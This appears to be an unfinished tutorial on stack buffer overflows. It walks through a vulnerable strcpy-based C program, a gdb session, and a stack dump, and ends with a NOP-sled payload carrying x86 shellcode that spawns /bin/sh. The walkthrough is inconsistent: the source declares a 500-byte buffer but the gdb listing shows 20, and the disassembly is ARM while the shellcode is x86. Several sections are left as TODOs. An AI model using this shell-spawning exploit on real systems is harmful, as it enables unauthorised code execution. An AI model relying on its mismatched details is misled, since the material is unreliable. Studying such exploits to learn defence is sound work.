# Buffer overflow
From [OWASP](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow):
> A buffer overflow condition exists when a program attempts to put more data in a buffer than it can hold or when a program attempts to put data in a memory area past a buffer. In this case, a buffer is a sequential section of memory allocated to contain anything from a character string to an array of integers. Writing outside the bounds of a block of allocated memory can corrupt data, crash the program, or cause the execution of malicious code.

## Process memory sections
```
 High memory addresses
 ______________________
|                      |    
| Env vars/program args|
|______________________|
|                      | Used for function calls, passing parameters, storing local variables. 
| Stack                | Quite limited space.
|______________________|
|                      |
|                      |
| Heap                 | Allocates bigger chunks of data. 
|                      |
|______________________|
|                      |
| Global variables     |
|______________________|
|                      | 
| Text (Code)          |
|______________________|

Low memory addresses
```

## Stack
The stack, also known as the call stack, is a data structure located in the RAM memory that allows functions to call each other and also to store their local variables. // reword this

Let's say a function F1 calls the function F2, and the function F2 calls the function F3. Also, each function i defines a local variable VFi. Let's see what the stack would look like for each 

// TODO FINISH EXAMPLE

## Example
This is a classic example of a C program that is vulnerable to buffer overflow attacks:
```C
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
  char buffer[500];
  strcpy(buffer, argv[1]);
  return 0;
}
```

This program is vulnerable because the function `strcpy` is memory unsafe: if the argument's length is greater than 500 it will overwrite the contiguous memory addresses. Does it sound familiar already? 😏 Let's move on.

First, compile the program:
```bash
gcc -g bufferOverflow.c
```
This should have generated an output file, in our case the default one `a.out` (use `-o` to change output name).

Note also the -g flag, which generates debug info to be used with the [gdb debugger](https://www.gnu.org/software/gdb/).

Run the output using the debugger:
```bash
gdb a.out
```

The command `list` should print out the source code of `bufferOverflow.c`:
```C
(gdb) list
1	#include <stdio.h>
2	#include <string.h>
3
4	int main(int argc, char **argv) {
5	  char buffer[20];
6	  strcpy(buffer, argv[1]);
7	  return 0;
8	}
```

Run `disas main` to see the assembly code:
```assembly
(gdb) disas main
Dump of assembler code for function main:
   0x0000050c <+0>:	push	{r7, lr}
   0x0000050e <+2>:	sub	sp, #32
   0x00000510 <+4>:	add	r7, sp, #0
   0x00000512 <+6>:	str	r0, [r7, #4]
   0x00000514 <+8>:	str	r1, [r7, #0]
   0x00000516 <+10>:	ldr	r3, [r7, #0]
   0x00000518 <+12>:	adds	r3, #4
   0x0000051a <+14>:	ldr	r2, [r3, #0]
   0x0000051c <+16>:	add.w	r3, r7, #12
   0x00000520 <+20>:	mov	r1, r2
   0x00000522 <+22>:	mov	r0, r3
   0x00000524 <+24>:	blx	0x3cc <strcpy@plt>
   0x00000528 <+28>:	movs	r3, #0
   0x0000052a <+30>:	mov	r0, r3
   0x0000052c <+32>:	adds	r7, #32
   0x0000052e <+34>:	mov	sp, r7
   0x00000530 <+36>:	pop	{r7, pc}
```

Now it's when things get interesting. We need to be able to see where 
run $(python -c 'print("A" * 504 + "B" * 4)')


 x/300x $sp
 
 ```
 0x7efff948:	0x76fc2000	0x7efffa94	0x00000002	0x0040050d
0x7efff958:	0x9c9319df	0x9482da2a	0x0040053d	0x00000000
0x7efff968:	0x004003fd	0x00000000	0x00000000	0x00000000
0x7efff978:	0x00411000	0x00000000	0x00000000	0x00000000
0x7efff988:	0x00000000	0x00000000	0x00000000	0x00000000
0x7efff998:	0x00000000	0x00000000	0x00000000	0x00000000
0x7efff9a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x7efff9b8:	0x00000000	0x00000000	0x00000001	0x76fff970
0x7efff9c8:	0x7efff9ec	0x76fffb2c	0x76fffb2c	0x00000000
0x7efff9d8:	0x00000000	0x76f90bed	0x7efffa20	0x00000000
0x7efff9e8:	0x00000000	0xffffffff	0x76ffd128	0x76ed8ce8
0x7efff9f8:	0x76ff91b8	0x76fc2000	0x7efffbb9	0x7efffa94
0x7efffa08:	0x76fc5574	0x76fc5574	0x000000a8	0x00000001
0x7efffa18:	0x00411014	0x76ff9920	0x76ff9de0	0x00000000
0x7efffa28:	0x00000001	0x00411000	0x00000000	0x76fe130b
0x7efffa38:	0x76ff94b8	0x00000001	0x00000001	0x00000000
0x7efffa48:	0x7efffaa0	0x76ed8ce8	0x7efffaa0	0x00000000
0x7efffa58:	0x00000000	0x004003fd	0x00000000	0x00000000
0x7efffa68:	0x00000000	0x76fe53e8	0x00000000	0x00000000
0x7efffa78:	0x004003fd	0x00000000	0x00000000	0x00400431
0x7efffa88:	0x0040057d	0x76fe1a31	0x7efffa94	0x7efffbb9
0x7efffa98:	0x7efffbe2	0x00000000	0x7efffddb	0x7efffdeb
0x7efffaa8:	0x7efffe12	0x7efffe1f	0x7efffe34	0x7efffe43
0x7efffab8:	0x7efffe4c	0x7efffe57	0x7efffe68	0x7efffe73
0x7efffac8:	0x7efffea5	0x7efffebc	0x7efffed0	0x7efffeda
(gdb)
0x7efffad8:	0x7efffee2	0x7efffef4	0x7effff10	0x7effff31
0x7efffae8:	0x7effff73	0x7effffa6	0x7effffb9	0x00000000
0x7efffaf8:	0x00000021	0x76ffd000	0x00000010	0x003fb0d6
0x7efffb08:	0x00000006	0x00001000	0x00000011	0x00000064
0x7efffb18:	0x00000003	0x00400034	0x00000004	0x00000020
0x7efffb28:	0x00000005	0x00000009	0x00000007	0x76fd6000
0x7efffb38:	0x00000008	0x00000000	0x00000009	0x004003fd
0x7efffb48:	0x0000000b	0x00000000	0x0000000c	0x00000000
0x7efffb58:	0x0000000d	0x00000000	0x0000000e	0x00000000
0x7efffb68:	0x00000017	0x00000000	0x00000019	0x7efffba5
0x7efffb78:	0x0000001a	0x00000010	0x0000001f	0x7effffd3
0x7efffb88:	0x0000000f	0x7efffbb5	0x00000000	0x00000000
0x7efffb98:	0x00000000	0x00000000	0x00000000	0xb5af1400
0x7efffba8:	0x6ce0972d	0x288d19e2	0xc036a4ab	0x6c377654
0x7efffbb8:	0x6f722f00	0x722f746f	0x736f7065	0x726f7469
0x7efffbc8:	0x2f736569	0x66667562	0x6f2d7265	0x66726576
0x7efffbd8:	0x2f776f6c	0x756f2e61	0x41410074	0x41414141
0x7efffbe8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffbf8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc08:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc18:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc28:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc38:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc48:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc58:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb)
0x7efffc68:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc78:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc88:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffc98:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffca8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffcb8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffcc8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffcd8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffce8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffcf8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd08:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd18:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd28:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd38:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd48:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd58:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd68:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd78:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd88:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffd98:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffda8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffdb8:	0x41414141	0x41414141	0x41414141	0x41414141
0x7efffdc8:	0x41414141	0x41414141	0x41414141	0x42424141
0x7efffdd8:	0x53004242	0x4c4c4548	0x69622f3d	0x61622f6e
0x7efffde8:	0x50006873	0x2f3d4457	0x746f6f72	0x7065722f
```

Let's take the address `0x7efffcb8` and replace it where "B"s are:

assuming 43 bytes of payload we need to print 418 \90

Finally the number was 454:
$(python -c 'print("\x90" * 454 + "\xeb\x24\x5e\x89\x74\x24\x08\x31\xc0\x88\x44\x24\x07\x89\x44\x24\x0c\xb0\x0b\x89\xf3\x8d\x4c\x24\x08\x8d\x54\x24\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh" + "\xb8\xfc\xff\x7e")')


## Resources
https://www.youtube.com/watch?v=1S0aBV-Waeo

